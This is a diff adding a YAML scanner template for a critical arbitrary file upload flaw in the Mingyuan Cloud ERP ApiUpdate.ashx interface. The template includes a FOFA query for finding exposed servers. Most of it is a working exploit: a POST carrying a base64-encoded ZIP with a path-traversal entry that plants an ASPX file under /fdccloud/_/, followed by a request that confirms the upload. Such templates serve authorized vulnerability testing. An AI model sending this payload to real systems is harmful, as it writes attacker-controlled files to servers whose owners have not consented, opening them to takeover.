@@ -1,0 +1,45 @@
+id: mingyuan-erp-apiupdate-fileupload
+
+info:
+  name: 明源云 ERP系统 接口管家 ApiUpdate.ashx 任意文件上传漏洞
+  author: zan8in
+  severity: critical
+  description: |-
+    明源云 ERP系统接口管家 ApiUpdate.ashx 文件存在任意文件上传漏洞，攻击者通过构造特殊的ZIP压缩包可以上传任意文件，控制服务器
+    漏洞存在于某端口下的接口管家服务
+    FOFA: "接口管家站点正常！"
+  tags: mingyuanyun,fileupload
+
+
+http:
+  - raw:
+      - |
+        POST /myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a HTTP/1.1
+        Host: {{Hostname}}
+
+        {{base64_decode("UEsDBBQAAAAIAPKaC1eX6YtyjAAAAJMAAAAeAAAALi4vLi4vLi4vZmRjY2xvdWQvXy9jaGVjay5hc3B4JMzLCsIwFATQXwmRQrsJCt1IqyiKUPBRWsT1bRhqIWliHoJ/b8TdMGeYOtuxlkawM81jTGHDDwvOsm2doNHWuMCupOEtyWT9xwdo0dz+E9YlMLOHeLgpIOdSlstyNax5UZ0mBXGEQup7uDecuJBtKTzzDq8IH8TdKbEfvFEx4AdFUaXbLwAAAP//AwBQSwECFAMUAAAACADymgtXl+mLcowAAACTAAAAHgAAAAAAAAAAAAAAAAAAAAAALi4vLi4vLi4vZmRjY2xvdWQvXy9jaGVjay5hc3B4UEsFBgAAAAABAAEATAAAAMgAAAAAAA==")}}
+
+      - |
+        GET /fdccloud/_/check.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        part: status_code_1
+        status:
+          - 200
+      - type: word
+        words:
+          - '{"Message":"OK"}'
+        part: body_1
+        condition: and
+      - type: status
+        part: status_code_2
+        status:
+          - 200
+      - type: word
+        words:
+          - 'cc4041b9'
+        part: body_2
+        condition: and
